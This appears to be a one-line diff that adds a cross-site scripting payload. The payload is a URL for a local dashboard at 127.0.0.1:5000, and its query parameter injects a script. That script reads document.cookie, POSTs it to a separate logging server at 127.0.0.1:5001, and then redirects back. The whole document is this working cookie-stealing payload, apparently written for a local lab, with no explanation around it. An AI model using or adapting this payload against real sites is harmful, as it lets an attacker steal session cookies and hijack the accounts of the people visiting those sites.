@@ -1,0 +1,1 @@
+http://127.0.0.1:5000/dashboard?q=<script>fetch('http://127.0.0.1:5001/log_cookie', { method: 'POST', body: document.cookie }).then(() => window.location.href = 'http://127.0.0.1:5000/dashboard');</script>
